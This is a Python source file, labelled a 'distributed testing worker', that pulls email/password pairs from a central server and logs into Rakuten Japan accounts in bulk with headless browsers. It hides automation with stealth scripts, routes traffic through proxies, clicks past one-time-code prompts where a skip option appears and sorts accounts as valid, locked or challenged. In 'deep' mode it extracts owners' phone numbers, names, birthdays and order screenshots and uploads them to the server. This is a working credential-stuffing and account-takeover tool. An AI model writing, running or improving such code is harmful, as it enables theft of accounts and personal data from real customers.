# -*- coding: utf-8 -*-
"""
Rakuten Japan 分布式协同测试节点 (Distributed Cloud Worker)
功能：
1. 从中枢 (Master API 或本地共享 accounts.json) 原子认领账号 (逆向/正向)
2. 执行严格真实的乐天双步登录与风控识别
3. 截图留存并原子回传同步结果，绝不重复测试！
"""

import os
import sys
import time
import json
import argparse
import logging
from datetime import datetime
import requests
from playwright.sync_api import sync_playwright

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCREENSHOTS_DIR = os.path.join(BASE_DIR, "data", "screenshots")
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
window.navigator.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };
Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
Object.defineProperty(navigator, 'languages', { get: () => ['ja-JP', 'ja', 'en-US', 'en'] });
"""

def test_login_strict(email: str, password: str, proxy: str = ""):
    clean_name = "".join([c if c.isalnum() else "_" for c in email])
    snap_prefix = os.path.join(SCREENSHOTS_DIR, clean_name)

    with sync_playwright() as p:
        launch_args = [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-infobars",
            "--disable-dev-shm-usage",
            "--lang=ja-JP"
        ]
        
        proxy_dict = None
        if proxy and ":" in proxy:
            parts = proxy.split(":")
            if len(parts) == 4:
                proxy_dict = {"server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
            elif len(parts) == 2:
                proxy_dict = {"server": f"http://{parts[0]}:{parts[1]}"}

        browser = p.chromium.launch(headless=True, args=launch_args, proxy=proxy_dict)
        context = browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            locale="ja-JP",
            timezone_id="Asia/Tokyo"
        )
        context.add_init_script(STEALTH_JS)
        page = context.new_page()

        try:
            # 打开购买履历主页
            page.goto("https://order.my.rakuten.co.jp/", wait_until="domcontentloaded", timeout=40000)
            time.sleep(3.0)

            # Step 1: 填入用户名并提交
            user_input = page.locator('#user_id, input[name="username"], input[type="email"], input[type="text"]').first
            user_input.wait_for(state="visible", timeout=10000)
            user_input.fill(email)
            time.sleep(0.5)
            user_input.press("Enter")
            time.sleep(3.0)

            # Step 2: 填入密码并按 Enter 提交
            pwd_input = page.locator('input[type="password"], #password_current, input[name="password"]').first
            try:
                pwd_input.wait_for(state="visible", timeout=8000)
                pwd_input.fill(password)
                time.sleep(0.5)
                pwd_input.press("Enter")
                time.sleep(7.0)
            except Exception:
                pass

            # Step 3: 严格核验返回状态与现场快照
            current_url = page.url
            body_text = page.inner_text("body") if page.locator("body").count() > 0 else ""

            if "正しくありません" in body_text or "一致しません" in body_text:
                page.screenshot(path=f"{snap_prefix}_wrong_password.png")
                browser.close()
                return "密码错误", "密码错误 (ユーザIDまたはパスワードが正しくありません)"

            if "アカウントをロック" in body_text or "アカウントロック" in body_text:
                page.screenshot(path=f"{snap_prefix}_account_locked.png")
                browser.close()
                return "账号已冻结/锁定", "官方封号锁定 (お客様のアカウントをロックしております)"

            # 若页面已呈现已登录特征（用户名、利用可能ポイント、購入履歴、ログアウト）
            if ("利用可能ポイント" in body_text or "ログアウト" in body_text or "購入履歴" in body_text or "買い物かご" in body_text) and "パスワードを入力" not in body_text:
                page.screenshot(path=f"{snap_prefix}_login_success.png")
                browser.close()
                return "正常活跃", "真正登录成功！已核验真实登录态 (履历主页)"

            if "ワンタイムパスワード" in body_text or "確認コード" in body_text or "認証コード" in body_text or "メールアドレスをご確認ください" in body_text:
                skip_btn = page.locator('button:has-text("スキップしてログイン"), a:has-text("スキップしてログイン"), [role="button"]:has-text("スキップしてログイン")').first
                if skip_btn.count() > 0:
                    skip_btn.click()
                    time.sleep(4.5)
                    current_url = page.url
                    body_text = page.inner_text("body") if page.locator("body").count() > 0 else ""
                    if ("利用可能ポイント" in body_text or "ログアウト" in body_text or "購入履歴" in body_text or "rakuten.co.jp" in current_url) and "login.account" not in current_url:
                        page.screenshot(path=f"{snap_prefix}_login_success.png")
                        browser.close()
                        return "正常活跃", "真正登录成功！(通过スキップ直接进入)"
                else:
                    page.screenshot(path=f"{snap_prefix}_otp_challenge.png")
                    browser.close()
                    return "需2FA验证码", "触发 2FA 验证码挑战 (无跳过按钮)"

            if "ロボット" in body_text or "challenge" in current_url.lower():
                page.screenshot(path=f"{snap_prefix}_captcha_challenge.png")
                browser.close()
                return "需滑块验证", "触发 Akamai 人机滑块验证"

            if "パスキー" in body_text or "passkey" in current_url.lower():
                page.screenshot(path=f"{snap_prefix}_passkey_challenge.png")
                browser.close()
                return "需Passkey验证", "触发 Passkey 验证挑战"

            if "order.my.rakuten.co.jp" in current_url and "login" not in current_url and "sign_in" not in current_url:
                if "購入履歴" in body_text or "ログアウト" in body_text:
                    page.screenshot(path=f"{snap_prefix}_login_success.png")
                    browser.close()
                    return "正常活跃", "真正登录成功！已核验真实登录态"

            page.screenshot(path=f"{snap_prefix}_login_failed.png")
            browser.close()
            return "登录失败", f"未能进入个人中心 (停留: {current_url[:50]})"

        except Exception as e:
            try:
                page.screenshot(path=f"{snap_prefix}_error.png")
            except Exception:
                pass
            browser.close()
            err_str = str(e).lower()
            if "proxy" in err_str or "tunnel" in err_str or "err_proxy" in err_str:
                return "代理异常", f"代理连接/认证异常: {e}"
            elif "timeout" in err_str or "timed out" in err_str:
                return "网络超时", f"网络/页面加载超时: {e}"
            elif "target closed" in err_str or "browser has been closed" in err_str:
                return "网络超时", f"浏览器连接中断: {e}"
            else:
                return "页面结构异常", f"执行异常: {e}"



def single_worker_loop(thread_idx: int, total_threads: int, master_url: str, worker_id: str, direction: str, mode: str = "deep", partition: int = None, total_partitions: int = None, target: str = "active"):
    w_tag = f"{worker_id}_T{thread_idx + 1}" if total_threads > 1 else worker_id
    master_url = master_url.rstrip("/")
    part_str = f" | 分区: [{partition + 1}/{total_partitions}]" if total_partitions else ""
    print(f"⚡ [{w_tag}] Worker 线程启动 | 扫描方向: {direction} | 模式: {mode.upper()} | 目标: {target.upper()}{part_str}")

    try:
        from rakuten_deep_profile_extractor import RakutenProfileExtractor
    except ImportError:
        RakutenProfileExtractor = None

    consecutive_empty = 0
    while True:
        try:
            # 1. 向中枢原子认领账号 (带静态分区与目标参数)
            claim_params = f"worker_id={w_tag}&direction={direction}&target={target}"
            if total_partitions is not None and partition is not None:
                claim_params += f"&partition_index={partition}&total_partitions={total_partitions}"
            
            claim_url = f"{master_url}/api/worker/claim?{claim_params}"
            res = requests.get(claim_url, timeout=30).json()

            if not res.get("success"):
                consecutive_empty += 1
                if thread_idx == 0 and consecutive_empty % 6 == 1:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] 队列暂无可处理账号 ({res.get('message')})，持续守护待命中 (10s 轮询)...")
                time.sleep(10)
                continue

            consecutive_empty = 0
            acc = res["account"]
            email = acc["email"]
            pwd = acc["password"]
            proxy = acc.get("proxy", "")
            remaining = res.get("remaining", 0)
            part_disp = f" (分区 {res.get('partition', '')})" if res.get("partition") else ""

            print(f"\n⚡ [{w_tag}]{part_disp} 认领账号: {email} (本区剩余待测: {remaining})")
            
            # 2. 真实执行测试与抓图
            if mode == "deep" and RakutenProfileExtractor:
                extractor = RakutenProfileExtractor(email, pwd, proxy=proxy, headless=True)
                full_res = extractor.execute()
                status = full_res.get("status", "提取异常")
                msg = full_res.get("message", "")
                
                # 构造汇报数据包
                report_payload = {
                    **full_res,
                    "worker_id": w_tag
                }
                print(f"   >>> [{w_tag}] [深度挖掘完成] 状态: {status} | 手机: {full_res.get('phone', '无')} | 姓名: {full_res.get('last_name', '')} {full_res.get('first_name', '')} | 生日: {full_res.get('birthday', '')}")
            else:
                status, msg = test_login_strict(email, pwd, proxy)
                report_payload = {
                    "email": email,
                    "status": status,
                    "message": msg,
                    "worker_id": w_tag
                }
                print(f"   >>> [{w_tag}] [基础登录判定] 结果: {status} | 详情: {msg}")

            # 3. 自动同步双重现场快照至中枢 (订单截图 + 个人信息页截图 + 登录截图)
            upload_url = f"{master_url}/api/worker/upload_screenshot"
            for shot_field in ["orders_screenshot", "profile_screenshot", "login_screenshot"]:
                local_shot = report_payload.get(shot_field)
                if local_shot and os.path.exists(local_shot):
                    try:
                        with open(local_shot, "rb") as sf:
                            fname = os.path.basename(local_shot)
                            requests.post(upload_url, files={"file": (fname, sf, "image/png")}, timeout=15)
                            report_payload[shot_field] = f"data/screenshots/{fname}"
                    except Exception as ue:
                        pass

            # 附带规范的排他性 failure_category 和 failure_code
            fail_cat = "-"
            fail_code = "-"
            if status == "正常活跃":
                fail_cat = "active"
                fail_code = "SUCCESS"
            elif status == "密码错误":
                fail_cat = "wrong_password"
                fail_code = "WRONG_PASSWORD"
            elif "锁定" in status or "冻结" in status:
                fail_cat = "account_locked"
                fail_code = "ACCOUNT_LOCKED"
            elif "2FA" in status:
                fail_cat = "two_factor_auth"
                fail_code = "2FA_CHALLENGE"
            elif "Passkey" in status:
                fail_cat = "passkey_challenge"
                fail_code = "PASSKEY_REQUIRED"
            elif "滑块" in status or "风控" in status:
                fail_cat = "captcha_challenge"
                fail_code = "CAPTCHA_CHALLENGE"
            elif "代理" in status:
                fail_cat = "proxy_timeout"
                fail_code = "PROXY_TIMEOUT"
            elif "超时" in status:
                fail_cat = "network_timeout"
                fail_code = "NETWORK_TIMEOUT"
            elif "订单" in status:
                fail_cat = "order_error"
                fail_code = "ORDER_EXTRACTION_ERROR"
            else:
                fail_cat = "other_failed"
                fail_code = "LOGIN_FAILED"

            report_payload["failure_category"] = fail_cat
            report_payload["failure_code"] = fail_code

            # 4. 原子回传汇报结果
            report_url = f"{master_url}/api/worker/report"
            requests.post(report_url, json=report_payload, timeout=30)

            time.sleep(1.0)

        except Exception as e:
            print(f"❌ [{w_tag}] Worker 调度异常: {e}")
            time.sleep(3)


def run_worker(master_url: str, worker_id: str, direction: str, mode: str = "deep", partition: int = None, total_partitions: int = None, concurrency: int = 1, target: str = "active"):
    part_str = f" | 分区: [{partition + 1}/{total_partitions}]" if total_partitions else " | 全局调度"
    print("=" * 75)
    print(f"🚀 Rakuten 分布式 Worker 启动 | 节点: {worker_id} | 并发: {concurrency} 线程 | 模式: {mode.upper()} | 目标: {target.upper()}{part_str}")
    print(f"📡 调度中枢: {master_url}")
    print("=" * 75)

    if concurrency <= 1:
        single_worker_loop(0, 1, master_url, worker_id, direction, mode, partition, total_partitions, target)
    else:
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency, thread_name_prefix=f"{worker_id}_Worker") as executor:
            futures = [
                executor.submit(single_worker_loop, i, concurrency, master_url, worker_id, direction, mode, partition, total_partitions, target)
                for i in range(concurrency)
            ]
            concurrent.futures.wait(futures)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Rakuten Cloud Worker")
    parser.add_argument("--master", default="http://127.0.0.1:8998", help="Master server URL (e.g. http://1.2.3.4:8998)")
    parser.add_argument("--worker-id", default="cloud_node_01", help="Unique Worker ID")
    parser.add_argument("--direction", default="forward", choices=["forward", "reverse"], help="Scan direction")
    parser.add_argument("--mode", default="deep", choices=["deep", "basic"], help="Execution mode: deep (phone & profile) or basic (login only)")
    parser.add_argument("--target", default="active", choices=["active", "all"], help="Account target pool: active (only successful accounts) or all (all pending accounts)")
    parser.add_argument("--partition", type=int, default=None, help="Partition index (0-indexed, e.g. 0, 1, 2)")
    parser.add_argument("--total-partitions", type=int, default=None, help="Total number of partitions (e.g. 3)")
    parser.add_argument("--concurrency", type=int, default=20, help="Number of concurrent worker threads (cluster standard: 20)")
    args = parser.parse_args()

    run_worker(args.master, args.worker_id, args.direction, args.mode, args.partition, args.total_partitions, args.concurrency, args.target)
